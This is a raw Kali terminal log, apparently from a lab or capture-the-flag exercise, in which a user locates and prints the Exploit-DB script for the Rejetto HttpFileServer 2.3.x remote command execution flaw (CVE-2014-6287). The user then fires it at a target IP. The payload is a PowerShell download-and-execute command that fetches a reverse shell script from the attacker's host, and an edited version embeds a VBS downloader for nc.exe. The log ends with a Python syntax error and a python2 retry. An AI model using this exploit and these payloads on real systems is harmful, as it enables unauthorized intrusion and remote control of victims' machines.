


```sh
┌──(kali㉿kali)-[~]
└─$ searchsploit HttpFileServer 2.3          
------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                          |  Path
------------------------------------------------------------------------ ---------------------------------
Rejetto HttpFileServer 2.3.x - Remote Command Execution (3)             | windows/webapps/49125.py
------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

https://github.com/randallbanner/Rejetto-HTTP-File-Server-HFS-2.3.x---Remote-Command-Execution/blob/main/hfs-2-3-exploit.py

https://www.exploit-db.com/exploits/39161

https://nvd.nist.gov/vuln/detail/CVE-2014-6287

https://github.com/rapid7/metasploit-framework/pull/3793


```sh
┌──(kali㉿kali)-[~]
└─$ searchsploit HttpFileServer 2.3          
-------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                              |  Path
-------------------------------------------------------------------------------------------- ---------------------------------
Rejetto HttpFileServer 2.3.x - Remote Command Execution (3)                                 | windows/webapps/49125.py
-------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ find 49125.py    
find: ‘49125.py’: No such file or directory
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ find \ -type f 49125.py
find: ‘ -type’: No such file or directory
find: ‘f’: No such file or directory
find: ‘49125.py’: No such file or directory
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ find --help            
Usage: find [-H] [-L] [-P] [-Olevel] [-D debugopts] [path...] [expression]

Default path is the current directory; default expression is -print.
Expression may consist of: operators, options, tests, and actions.

Operators (decreasing precedence; -and is implicit where no others are given):
      ( EXPR )   ! EXPR   -not EXPR   EXPR1 -a EXPR2   EXPR1 -and EXPR2
      EXPR1 -o EXPR2   EXPR1 -or EXPR2   EXPR1 , EXPR2

Positional options (always true):
      -daystart -follow -nowarn -regextype -warn

Normal options (always true, specified before other expressions):
      -depth -files0-from FILE -maxdepth LEVELS -mindepth LEVELS
       -mount -noleaf -xdev -ignore_readdir_race -noignore_readdir_race

Tests (N can be +N or -N or N):
      -amin N -anewer FILE -atime N -cmin N -cnewer FILE -context CONTEXT
      -ctime N -empty -false -fstype TYPE -gid N -group NAME -ilname PATTERN
      -iname PATTERN -inum N -iwholename PATTERN -iregex PATTERN
      -links N -lname PATTERN -mmin N -mtime N -name PATTERN -newer FILE
      -nouser -nogroup -path PATTERN -perm [-/]MODE -regex PATTERN
      -readable -writable -executable
      -wholename PATTERN -size N[bcwkMG] -true -type [bcdpflsD] -uid N
      -used N -user NAME -xtype [bcdpfls]

Actions:
      -delete -print0 -printf FORMAT -fprintf FILE FORMAT -print 
      -fprint0 FILE -fprint FILE -ls -fls FILE -prune -quit
      -exec COMMAND ; -exec COMMAND {} + -ok COMMAND ;
      -execdir COMMAND ; -execdir COMMAND {} + -okdir COMMAND ;

Other common options:
      --help                   display this help and exit
      --version                output version information and exit

Valid arguments for -D:
exec, opt, rates, search, stat, time, tree, all, help
Use '-D help' for a description of the options, or see find(1)

Please see also the documentation at https://www.gnu.org/software/findutils/.
You can report (and track progress on fixing) bugs in the "find"
program via the GNU findutils bug-reporting page at
https://savannah.gnu.org/bugs/?group=findutils or, if
you have no web access, by sending email to <bug-findutils@gnu.org>.
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ find \ -type f -name 49125.py
find: ‘ -type’: No such file or directory
find: ‘f’: No such file or directory
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ find / -type f -name 49125.py
find: ‘/usr/lib/mysql/plugin/auth_pam_tool_dir’: Permission denied
/usr/share/exploitdb/exploits/windows/webapps/49125.py
find: ‘/lost+found’: Permission denied
find: ‘/var/cache/apparmor/201d1af9.0’: Permission denied
find: ‘/var/cache/private’: Permission denied
find: ‘/var/cache/lightdm’: Permission denied
find: ‘/var/cache/apt/archives/partial’: Permission denied
find: ‘/var/cache/ldconfig’: Permission denied
find: ‘/var/log/inetsim’: Permission denied
find: ‘/var/log/private’: Permission denied
find: ‘/var/log/speech-dispatcher’: Permission denied
find: ‘/var/log/lightdm’: Permission denied
find: ‘/var/log/samba/cores’: Permission denied
find: ‘/var/spool/cron/crontabs’: Permission denied
find: ‘/var/spool/exim4’: Permission denied
find: ‘/var/lib/polkit-1’: Permission denied
find: ‘/var/lib/postgresql/16/main’: Permission denied
find: ‘/var/lib/private’: Permission denied
find: ‘/var/lib/php/sessions’: Permission denied
find: ‘/var/lib/strongswan’: Permission denied
find: ‘/var/lib/redis’: Permission denied
find: ‘/var/lib/mysql/mysql’: Permission denied
find: ‘/var/lib/mysql/performance_schema’: Permission denied
find: ‘/var/lib/mysql/sys’: Permission denied
find: ‘/var/lib/arpwatch’: Permission denied
find: ‘/var/lib/udisks2’: Permission denied
find: ‘/var/lib/lightdm’: Permission denied
find: ‘/var/lib/NetworkManager’: Permission denied
find: ‘/var/lib/apt/lists/partial’: Permission denied
find: ‘/var/lib/bluetooth’: Permission denied
find: ‘/var/lib/openvas/gnupg’: Permission denied
find: ‘/var/lib/samba/usershares’: Permission denied
find: ‘/var/lib/AccountsService/users’: Permission denied
find: ‘/var/lib/beef-xss’: Permission denied
find: ‘/var/tmp/systemd-private-805d64cfa8214bc9826c1d7092c6834d-haveged.service-Zr7Isi’: Permission denied
find: ‘/var/tmp/systemd-private-805d64cfa8214bc9826c1d7092c6834d-systemd-timesyncd.service-Xvrnqa’: Permission denied
find: ‘/var/tmp/systemd-private-805d64cfa8214bc9826c1d7092c6834d-colord.service-kXcwhr’: Permission denied
find: ‘/var/tmp/systemd-private-805d64cfa8214bc9826c1d7092c6834d-systemd-logind.service-21Nhni’: Permission denied
find: ‘/var/tmp/systemd-private-805d64cfa8214bc9826c1d7092c6834d-upower.service-UsZBeg’: Permission denied
find: ‘/var/tmp/systemd-private-805d64cfa8214bc9826c1d7092c6834d-ModemManager.service-Tb1n57’: Permission denied
find: ‘/var/tmp/systemd-private-805d64cfa8214bc9826c1d7092c6834d-polkit.service-yMGEcs’: Permission denied
find: ‘/etc/polkit-1/rules.d’: Permission denied
find: ‘/etc/vpnc’: Permission denied
find: ‘/etc/redis’: Permission denied
find: ‘/etc/ipsec.d/private’: Permission denied
find: ‘/etc/ssl/private’: Permission denied
find: ‘/etc/openvas/gnupg’: Permission denied
find: ‘/etc/credstore.encrypted’: Permission denied
find: ‘/etc/credstore’: Permission denied
^[[A^[[A^C
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ find / -type f -name 49125.py 2>/dev/null
/usr/share/exploitdb/exploits/windows/webapps/49125.py
^C
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ cat /usr/share/exploitdb/exploits/windows/webapps/49125.py
# Exploit Title: Rejetto HttpFileServer 2.3.x - Remote Command Execution (3)
# Google Dork: intext:"httpfileserver 2.3"
# Date: 28-11-2020
# Remote: Yes
# Exploit Author: Óscar Andreu
# Vendor Homepage: http://rejetto.com/
# Software Link: http://sourceforge.net/projects/hfs/
# Version: 2.3.x
# Tested on: Windows Server 2008 , Windows 8, Windows 7
# CVE : CVE-2014-6287

#!/usr/bin/python3

# Usage :  python3 Exploit.py <RHOST> <Target RPORT> <Command>
# Example: python3 HttpFileServer_2.3.x_rce.py 10.10.10.8 80 "c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.4/shells/mini-reverse.ps1')"

import urllib3
import sys
import urllib.parse

try:
        http = urllib3.PoolManager()
        url = f'http://{sys.argv[1]}:{sys.argv[2]}/?search=%00{{.+exec|{urllib.parse.quote(sys.argv[3])}.}}'
        print(url)
        response = http.request('GET', url)

except Exception as ex:
        print("Usage: python3 HttpFileServer_2.3.x_rce.py RHOST RPORT command")
        print(ex)                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ cp /usr/share/exploitdb/exploits/windows/webapps/49125.py CVE-2014-6287.py
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ nano CVE-2014-6287.py                                                    
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ python3 CVE-2014-6287.py 10.10.114.253 8080 "c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.18.23.236:8000/shells/revshk.ps1')"
http://10.10.114.253:8080/?search=%00{.+exec|c%3A%5Cwindows%5CSysNative%5CWindowsPowershell%5Cv1.0%5Cpowershell.exe%20IEX%20%28New-Object%20Net.WebClient%29.DownloadString%28%27http%3A//10.18.23.236%3A8000/shells/revshk.ps1%27%29.}
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ python3 CVE-2014-6287.py 10.10.114.253 8080
  File "/home/kali/CVE-2014-6287.py", line 37
    vbs = "C:\Users\Public\script.vbs|dim%20xHttp%3A%20Set%20xHttp%20%3D%20createobject(%22Microsoft.XMLHTTP%22)%0D%0Adim%20bStrm%3A%20Set%20bStrm%20%3D%20createobject(%22Adodb.Stream%22)%0D%0AxHttp.Open%20%22GET%22%2C%20%22http%3A%2F%2F"+ip_addr+"%2Fnc.exe%22%2C%20False%0D%0AxHttp.Send%0D%0A%0D%0Awith%20bStrm%0D%0A%20%20%20%20.type%20%3D%201%20%27%2F%2Fbinary%0D%0A%20%20%20%20.open%0D%0A%20%20%20%20.write%20xHttp.responseBody%0D%0A%20%20%20%20.savetofile%20%22C%3A%5CUsers%5CPublic%5Cnc.exe%22%2C%202%20%27%2F%2Foverwrite%0D%0Aend%20with"
                                                                                                                                                                                                                                              ^
SyntaxError: (unicode error) 'unicodeescape' codec can't decode bytes in position 2-3: truncated \UXXXXXXXX escape

┌──(kali㉿kali)-[~]
└─$ python2 CVE-2014-6287.py 10.10.114.253 8080

```